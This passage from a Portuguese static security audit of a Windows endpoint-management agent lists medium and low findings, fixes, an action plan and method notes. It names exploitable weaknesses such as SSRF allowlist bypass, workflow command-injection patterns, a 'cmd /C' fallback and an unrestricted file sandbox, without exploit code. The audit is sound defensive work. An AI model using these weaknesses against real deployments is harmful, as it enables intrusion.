| M1 | app | `inventory\sync.go:520-531, 690-691` + `core\database\sqlite_cache_inventory.go:254-297` | Diff de inventário nunca reporta "sem mudanças": payload carrega `UpdatedAt`/`CollectedAt` voláteis → `ShouldSyncInventory` sempre detecta mudança e reenvia payload completo a cada ciclo (6h) |
| M2 | app | `services\notifications\service.go:586-588` + `native_toast_windows.go:109-123` | Toast nativo headless nunca exibe botões de ação (type mismatch `[]AgentNotificationAction` vs `[]any`) — `require_confirmation` no serviço sempre termina em `timeout_policy_applied` |
| M3 | app | `app.go:1796-1854` | Data race em `deferredRestartState`: callback do `time.AfterFunc` lê `deferCount`/`maxDefers` sem `ds.mu` (linhas 1841/1853) |
| M4 | app | `app.go:1761-1777` | Shutdown fecha SQLite após timeout de 3s enquanto goroutines de startup podem estar usando o DB |
| M5 | app | `companion_controller.go:126-129` + `ipc_app_integration.go:131-191` | Fallback standalone inicia segundo core mantendo IPC client vivo — dois cores simultâneos quando o serviço volta |
| M6 | app | `main.go:57-66` + `decommission\service.go:74-125` | Flag CLI `--agent-delete-cleanup` executa DELETE remoto do agente sem confirmação — invocável por qualquer usuário local (DoS de gestão) |
| M7 | core | `netproxy\proxy.go:43-71` + `allowlist.go:76-84` | Allowlist contornável via redirects (`CheckRedirect` permite qualquer host) + DNS TOCTOU (resolve na checagem, `Do` re-resolve) — SSRF pivot |
| M8 | core | `database\sqlite.go:190-429` | Sem mecanismo de migrations (só `CREATE TABLE IF NOT EXISTS`) — evolução de schema não aplica a bancos existentes |
| M9 | core | `ai\chat_logger.go:2-3, 59-119` | Todas as interações de chat (user+assistant+tool args) em texto plano, sem rotação/retention — privacidade em máquina de usuário final |
| M10 | core | `agentconn\runtime_nats.go:206-256` | Concorrência ilimitada: uma goroutine por comando NATS no fallback sem JetStream (sem semáforo; cada comando até 2min) |
| M11 | p2p | `p2p_replication.go:31-55` | Stream de replicação sem `SetDeadline` (worker trava para sempre) e `resp.Gone` tratado como sucesso (dedup sem transferência) |
| M12 | p2p | `p2p_fetch_election.go:256-273` + `p2p_fetch.go:213-250` | Retry sem backoff: artifact "failed" re-elege e baixa a cada 60s indefinidamente |
| M13 | p2p | `p2p_cleanup.go:21-27` + `platform\perms_windows.go:22-37` | `icacls.exe` spawnado em toda chamada de `P2PTempDir()` — inclusive sob `c.mu.RLock` do `GetStatus` e a cada gossip (45s) |
| M14 | p2p | `p2p.go:314-326` + `p2p_publish.go:92, 109-120` | SHA-256 de arquivo inteiro sob `sha256CacheMu` (serializa todos os ListArtifacts) + `manifestMatchesFile` re-hash por chamada sem cache |
| M15 | p2p | `p2pmeta\types.go:33` + `p2p\config.go:82` | `MaxBandwidthBytesPerSec` é normalizado mas nunca consumido — knob de bandwidth sem efeito |
| M16 | p2p | `p2p_lan_probe.go:22-25, 192-225` + `p2p_http.go:152-155` | LAN probe varre /24 (254 hosts × 5 portas × 48 workers) a cada 2min; `/p2p/health` sem auth expõe AgentID/PeerID/Addrs (recon) |
| M17 | fe | `js\app-support.js:381+401` | JSON do ticket serializado em atributo HTML quebra com entidades (`&quot;`) — card inaceitável sem feedback (catch vazio) |
| M18 | fe | `js\debug-http-bridge.js:56-59` | Bridge HTTP descarta argumentos além do primeiro — bindings multi-arg quebram no navegador (`AddTicketComment`, `CloseSupportTicket`, `AnswerChatQuestion`…) |
| M19 | fe/build | `main.go:22` + `frontend\a2ui\node_modules` | 31,3 MB de node_modules embedados (`//go:embed all:frontend`); exe 78,2 MB vs instalador 29,5 MB; runtime usa só `a2ui-bundle.js` (455 KB) |
| M20 | ci | `build-agent-bootstrap.yml:62-67` + `build-agent-installer.yml:73-77` | Inputs de workflow_dispatch interpolados direto no bloco `run` (`PayloadUrl = "${{ ... }}"`) — padrão de command injection; mapear para `env:` |
| M21 | ci | `build-agent-installer.yml:18-21` | Chave do servidor recebida como input plaintext de workflow_dispatch (visível no histórico da run; não é secret) |
| M22 | ci | todos os workflows | Actions sem pin de SHA (checkout/setup-go/upload-artifact + `softprops/action-gh-release@v2` com contents:write) |
| M23 | ci | `release-agent-on-tag.yml:8-9` | `permissions: contents: write` no nível do workflow (aplicado a todos os steps) |
| M24 | ci | workflows + `project.nsi:304-306` | Artefatos sem assinatura de código (signtool comentado; manifest só sha256 não assinado) |
| M25 | ci | `src\build\windows\Taskfile.yml:29` | Build via Taskfile sem `-X buildinfo.Version` (→ "0.0.0"; risco de self-update loop segundo os próprios warnings dos scripts PS) |
| M26 | automation | `automation\service.go:817, 825` | Nil deref de `db` nos blocos de cooldown do callback do cron (guard existe só na linha 805) + `cron.New()` sem `cron.Recover` — panic no job mata o processo |
| M27 | screen | `screen\monitor.go:46` (+ `capturer_gdi.go:142-152`) | Leak de `syscall.NewCallback` em `GetMonitors` (callback permanente, limite ~2000/processo) criado a cada 5s → crash após ~2-3h de sessão contínua |
| M28 | fileserver | `fileserver\server.go:828-847, 850-862, 960-987` | `copyDir`/`dirSize`/`zipDirProgress` seguem junctions sem proteção contra ciclos (`isReparsePoint` só usada em `handleList`) — recursão infinita em copy/move/zip |
| M29 | fileserver | `fileserver\server.go:870-897` + `manager.go:727-733` | Sandbox de arquivos nominal: root default `C:\` e `safePath` aceita caminhos absolutos — `put/delete/rename` em qualquer arquivo do drive (SYSTEM), sem denylist/auditoria |
| M30 | automation | `automation\executor.go:53-56` | RunScript/CustomCommand executam sem passar pelo gate de autorização (`authorize` só em `executePackageAction`); `ContentHashSHA256` do script nunca é verificado |
| M31 | mcp | `mcp\register.go:126-140, 174-181, 360-381` | Ações destrutivas do MCP (`uninstall_package`, `upgrade_all_packages`, `restart_spooler`, `clear_queue`) sem gate de confirmação no servidor — dependem de o LLM usar `ask_user` voluntariamente |
| M32 | agentconn | `runtime_protocol.go:69-74` | Fallback `default:` executa `cmd /C <command>` para qualquer cmdType desconhecido (amplia raio de dano; o app-layer já contorna por reconhecer o risco) |
| M33 | remotesession | `manager.go:316-330` + `recording_source.go:31` | Gravação de tela nunca inicia (`handleRecordingStart` não chama `RecordingSource.Start()`; evento "recording_started" é enganoso) + gravação sem indicador local ao usuário |
| M34 | automation | `automation\service.go:984, 797` | Cron na TZ local do agente sem contrato de timezone (`cron.New()` default = local time) — se backend define em UTC, tasks disparam fora do horário e o anti-loop conta sobre slots errados |

---

## 5. Achados Baixos

| # | Área | Arquivo:linha | Achado |
|---|------|---------------|--------|
| B1 | app | `inventory\sync.go:823-829` (uso em `:431`) | `sanitizeToken` local retorna token completo quando len ≤ 8 e loga `Authorization=Bearer <token>` no buffer persistido em arquivo |
| B2 | app | `chat.go:106-116` + `services\chat\service.go:210-220` | `GetChatConfig` diz "(API key masked)" no comentário mas retorna a chave integral |
| B3 | app | `ipc_windows.go:209-227` | `Broadcast` segura `s.mu` durante escritas de rede (3s/conexão) — zumbi serializa broadcasts; writes concorrentes com `RespondTo` |
| B4 | app | `app.go:1343-1345, 1675-1700` | Goroutines com `go func()` puro bypassam `safeGo` (sem recovery de panic) |
| B5 | app | `debughttp\broker.go:69-74` + `p2p\p2p_http.go:157-207` | `pollDropped` nunca incrementado (métrica sempre 0); `BuildArtifactAccess` gera URLs `/p2p/artifact/...` sem handler (código morto) |
| B6 | core | `ai\chat.go:414-421` | Mensagem do usuário fica órfã no histórico quando o request falha (reenvio duplica no histórico) |
| B7 | core | `ai\chat_multi_round.go:512` | Erro de `SetAgentAuthHeadersWithAgentID` engolido (request segue sem auth → 401 opaco) |
| B8 | core | `ai\chat_multi_round.go:763-775` | `truncateToolResult` fecha delimitadores na ordem errada (string aberta por último → JSON inválido) |
| B9 | core | `data\http_client.go:48, 189` | `cachedAt` escrito mas nunca lido — TTL 24h não aplicado em memória; revalidação de rede a cada chamada sem single-flight |
| B10 | core | `tlsutil\retry.go:117-119` | Retry considera todo erro (`err != nil`) e reaplica POST/PUT (latente — sem callers em produção) |
| B11 | p2p | `p2p.go:225-231, 258` | `started`/`ctx`/`cancel` escritos sem sincronização (race benigno, mas real) |
| B12 | p2p | `p2p_libp2p_transport.go:345-349` | GET serve `.partial` e sidecars `.meta` em andamento (peer consome arquivo incompleto) |
| B13 | fe | `styles\base.css:1` + `index.html:9-10` | `@import` de Google Fonts a cada load — agente enterprise faz requisição externa (privacidade/offline/FOUT) |
| B14 | fe | `js\app-support.js:385` | Injeção de CSS via `workflowState.color` do servidor (escapeHtml não neutraliza `;`/`:`) — validar com regex hex/rgb |
| B15 | fe | `js\app-init.js:477` (+ `app-chat.js:526-531`, `app-p2p.js:726-741`) | try/catch síncrono em torno de promise não aguardada — rejeições viram unhandledrejection |
| B16 | fe | `js\psadt-debug.js:426` | `lines.join("\\n")` junta com o literal `\n` (saída do preflight em uma linha) |
| B17 | fe | `js\p2p-debug.js:400-404` | `setInterval(..., 5000)` sem handle, nunca limpo |
| B18 | fe | `js\app-chat.js:1107-1134` | `startThinkingStatusUpdates` é dead code (se ativada, faria `GetLogs()` a cada 900ms) |
| B19 | fe | `js\app-utils.js:1317-1319` | `escapeHtmlAttr` apaga backticks (`replaceAll("\`","")`) — corrompe valores com crase |
| B20 | ci | workflows de build | `choco install nsis` sem pin + MinGW "se existir" no runner — drift entre builds |
| B21 | ci | `project.nsi:859-892` | config.json montado por concatenação de string — valores com `"`/`\` geram JSON inválido |
| B22 | ci | `build\server-api\linux\build-agent-server-linux.sh:265-274` | `installer.json` com `${API_KEY}` em heredoc sem escape; segredo em artefato plano |
| B23 | terminal | `terminal\dispatcher_windows.go:82-93` | Dispatcher pode ficar órfão em `Accept()` eterno (sem timeout nem monitor de morte do pai) — processo zumbi segurando named pipes a cada crash do agente |

---

## 6. Melhorias Recomendadas (priorizadas)

### Estruturais (segurança — alto valor)
1. **Whitelist explícita de métodos** no bridge HTTP de debug (mapa nome→handler), eliminando a reflexão — resolve C5 e B2 de uma vez.
2. **Integridade obrigatória no self-update**: verificar SHA-256 do servidor no download HTTP (C1), recusar P2P sem hash (C2) e ligar a validação Authenticode (A8).
3. **Autenticação no transporte P2P**: verificar token nos handlers libp2p (C3), assinar onboarding com segredo validável (C4) e restringir o gater a peers conhecidos.
4. **Handshake autenticado no pipe IPC** + SDDL restrito ao usuário da UI (A2); SDDL explícito também nos pipes do dispatcher de terminal.
5. **Migrar segredos para DPAPI** com fallback de leitura legado (A3) e endurecer ACLs de `%ProgramData%\Discovery` (C6) e do staging `%WINDIR%\Temp\Discovery` (C7: `Everyone:(RX)` em vez de `F`).
6. **Validação de entrada em pontos de execução**: distro WSL do campo `shell` (A14), cmdType desconhecido → rejeitar em vez de `cmd /C` (M32), gate de autorização para RunScript/CustomCommand + verificar `ContentHashSHA256` (M30), confirmação obrigatória nas tools destrutivas do MCP (M31), denylist no fileserver (M29).

### Robustez
7. **Fingerprint estável para diff de inventário** (excluir `UpdatedAt`/`CollectedAt` da comparação — M1), mesmo padrão do `computeAppStoreContentHash` existente.
8. **Migrations versionadas** no SQLite (`PRAGMA user_version` + ALTERs idempotentes — M8).
9. **Backoff/limites**: retry com backoff na eleição P2P (M12), semáforo de comandos NATS (M10), single-flight + min-stale no cache de catálogo (B9).
10. **Encapsular mutações de `fetchStateMap`** (A7), proteger `deferredRestartState` (M3), usar snapshot sob lock em `s.deferByTask` (A15) e corrigir o shutdown do MCP server (A16) — rodar `go test -race` no CI para regressão.
11. **Identidade libp2p persistente** + blocklist com expiração (A5) — reinício de agente não deve partir a malha.
12. **Corrigir watcher WTS** (A17: `0x02B1` + `NOTIFY_FOR_ALL_SESSIONS`) e acordar contrato de timezone do cron (M34).
13. **Callbacks/handles Win32**: callback único em `GetMonitors` (M27), bound de clipboard por `GlobalSize` (melhorias), `sessionId` validado como UUID antes de compor subjects NATS.

### Performance / custo
14. **Remover `a2ui/node_modules` do embed** (M19): exe ~78 MB → ~47 MB.
15. **Cache de snapshot de artefatos com TTL** para o gossip (evita walk+hash por request de cada peer — M14/M13); resolver `P2PTempDir()`/`EnsureWorldAccess` uma vez no Startup (M13).
16. **`sync.Pool` para buffers de frame** GDI/DXGI (~8 MB/frame a 30fps → centenas de MB/s de churn de GC hoje).
17. **Centralizar sanitização de token** em `logs.SanitizeToken` e proibir logar `Authorization` (B1) — auditar com grep.
18. **Self-host das fontes** (B13) e event delegation no frontend (menos re-attach pós-innerHTML).
19. **Limpeza de código morto** de segurança (validateAuthenticodeSignature, verifyToken sem caller, retry HTTP, `libp2pRequestAccess`) — ou conectar, ou remover, para não induzir falsa confiança.

### CI/CD
20. **Pin de actions por SHA** + `permissions` mínimos por job (M22/M23).
21. **Cobrir o pacote main e `cmd/discovery-service`** no pr-checks (hoje só `./app/... ./internal/...`) + cache do setup-go nos builds de release.
22. **Assinatura Authenticode** do instalador/agent/service + SBOM e checksums assinados no release (M24).
23. **Remover binários commitados** em `src\build\bin` (~107 MB no git) — gerar só no CI.

---

## 7. Pontos Positivos

1. **Zero XSS confirmado no frontend** — `escapeHtml` central (app-utils.js:1308) usado disciplinadamente em ~200 call sites de `innerHTML`; markdown/chat renderizam escape-first com allowlist de scheme; logs/toasts/modais via `textContent`; polling com cleanup sistemático (troca de aba, visibilitychange, backoff).
2. **Outbox pattern robusto** — `INSERT OR IGNORE` por idempotency_key + TTL 14d + cleanup em lote + backoff por tentativa (`sqlite_outbox_consolidation.go`, `sync\command_outbox.go`, outbox P2P com hash de payload + janela de dedup).
3. **Higiene HTTP consistente** — todos os pontos de chamada usam `tlsutil.NewHTTPClient(timeout)` (nenhum `http.Get` sem timeout); `netutil.SetAgentAuthHeadersWithAgentID` valida formato do token/agent ID; catálogo usa ETag/If-Modified-Since com limite de 50 MB.
4. **SQLite disciplinado** — 100% das queries parametrizadas, transações com `defer tx.Rollback()`, DSN com busy_timeout+WAL+synchronous para acesso multi-processo.
5. **TLS inseguro somente sob override explícito** de laboratório (`DISCOVERY_ALLOW_INSECURE_TLS` / `SetConfigAllowInsecureTLS`), com default seguro e MinVersion TLS12.
6. **Integridade em camadas no P2P** — SHA256 por chunk em streaming, SHA256 final na remontagem, validação cross-peer de manifests por voto majoritário, `SanitizeArtifactName` testado contra traversal.
7. **Winget blindado contra injeção** — `validateID` com regex `^[A-Za-z0-9._-]+$` e `exec.Command` com args separados; packageID do servidor nunca chega a um shell (`core\winget\client.go:15, 201-209`).
8. **Sanitização consistente nos scripts PowerShell do MCP** — allowlists (logs/níveis/orderBy) + escape de aspas (`eventlogPSLiteral`); inputs livres jamais interpolados crus (`eventlog.go`, `performance.go`).
9. **Ciclo de vida do terminal bem cuidado** — `waitOnce`/`closeOnce`, probe de morte prematura com fallback em camadas (dispatcher→ConPTY→legacy), monitor de exit e coalescer de output com rate-limit, patterns documentados.
10. **Concorrência evolutiva consciente** — cliente IPC eliminou a race histórica de dois readLoops (readLoop com conn/reader locais + watchdog); sync/appstore com singleflight; shutdown cancela contexto primeiro; locks de download por artifact com contagem de waiters.
11. **Anti-loop de automação bem projetado** — backoff de skips benignos + circuit breaker de falhas persistidos em markers SQLite, com janelas de reset e cap (`anti_loop.go`).
12. **`go vet ./...` limpo** (exit 0) em todo o módulo.

---

## 8. Plano de Ação Sugerido

| Fase | Itens | Esforço estimado |
|------|-------|------------------|
| **P0 — Imediato** (segurança explorável localmente/rede) | C1, C2, C5, C6, **C7**, A1, A13, **A15** (crash), **A16** (crash) | Baixo-Médio (maioria é checagem + early-return) |
| **P1 — Curto prazo** (autenticação de canais + execução) | C3, C4, A2, A4, A8, A10, A11, **A14**, **M30**, **M32** | Médio |
| **P2 — Sprint seguinte** (robustez/bugs) | A5, A6, A7, A9, **A15-A17**, M1-M16, **M26-M34** | Médio |
| **P3 — Backlog** (higiene/qualidade) | M13-M25 (restantes), B1-B23 | Baixo, incremental |

**Recomendação de verificação:** rodar a suíte com `-race` (`go test -race ./app/...`) após corrigir A7/M3/A15, adicionar testes para os caminhos de self-update com hash ausente/divergente, e um teste de regressão para o watcher WTS (A17) e o shutdown do MCP (A16).

---

## 9. Notas de Método e Limitações

- Revisão **estática** (sem execução/testes dinâmicos); severidades assumem o cenário de produção típico (agente elevado, LAN hostil possível).
- Ferramentas MCP do Codebase Memory (`get_architecture`, `search_graph`, etc.) não estavam disponíveis na sessão — a análise foi feita por leitura direta dos fontes (conforme instrução do AGENTS.md, a indexação seria preferencial; sem o MCP, o mapeamento manual de callers foi usado).
- Nenhum arquivo do projeto foi modificado; este relatório é o único artefato gerado.
- Achados marcados com arquivo:linha foram validados por leitura; os críticos/altos foram adicionalmente verificados por amostragem independente (C1, C2, C4, C5, C7, A1, A3, A15, A16, A17, A7-parcial, B1, M3 e evidências de NSIS).
- Alguns achados dependem de contexto de runtime para confirmação definitiva (ex.: frequência real de policy-sync para A15, comportamento do servidor para M34) — recomenda-se reprodução controlada antes de priorizar.
